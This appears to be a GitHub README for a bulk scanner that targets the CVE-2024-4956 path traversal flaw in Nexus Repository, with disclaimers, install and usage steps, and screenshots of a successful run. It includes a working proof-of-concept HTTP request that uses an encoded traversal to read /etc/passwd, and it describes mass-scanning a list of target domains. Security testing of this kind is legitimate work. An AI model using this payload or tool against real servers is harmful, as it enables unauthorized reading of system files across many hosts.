### README.md

# CVE-2024-4956 Bulk Scanner

## Disclaimer

> This tool is intended only for educational purposes and for testing in corporate environments. https://twitter.com/nav1n0x/ and https://github.com/ifconfig-me take no responsibility for the misuse of this code. Use it at your own risk. Do not attack a target you don't have permission to engage with. This tool uses the publicly released payload. 

This scanner helps security enthusiasts to scan Path Traversal Vulnerability in Nexus Repository targets in bulk. 

The scanner will show the number of targets loaded and the state of the current scanning. The URLs will be listed with three status messages: Timeout, Fail, or Success, based on the results. Ensure that `targets.txt` contains the list of domains and `lfi-payloads.txt` contains the list of payloads. The scanner will display the current URL being tested, updating with each new request, and indicate success or failure respectively. The script as well saves a list of succful urls in the directory as `successful_urls.txt`. It will provide a summary of the number of successful attempts at the end.

## Installation

Ensure you have Python 3.6+ and `pip` installed.

1. Clone the repository:

    * `git clone https://github.com/ifconfig-me/CVE-2024-4956-Bulk-Scanner.git`
    * `cd CVE-2024-4956-Bulk-Scanner`

3. Install the required dependencies:

    `pip install -r requirements.txt`

### Usage Instructions

1. Prepare your `targets.txt` file with the list of domains and `lfi-payloads.txt` with the list of payloads.

2. Run the scanner:

    `python3 CVE-2024-4956-scanner.py -d targets.txt -p lfi-payloads.txt`

### PoC 
```
GET /%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd HTTP/1.1
Host: target.com:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```
## Successful Attack
![image](https://github.com/ifconfig-me/CVE-2024-4956-Bulk-Scanner/assets/25315805/f469803f-25f6-4219-b3ee-12da40c2b0a5)

## Scanner In Action
![image](https://github.com/ifconfig-me/CVE-2024-4956-Bulk-Scanner/assets/25315805/190f357d-d8b6-490b-bfa3-97a907a8ca53)


## Disclaimer

> This tool is intended only for educational purposes and for testing in corporate environments. 
> https://twitter.com/nav1n0x/ and https://github.com/ifconfig-me take no responsibility for the code. 
> Use it at your own risk. Do not attack a target you don't have permission to engage with.
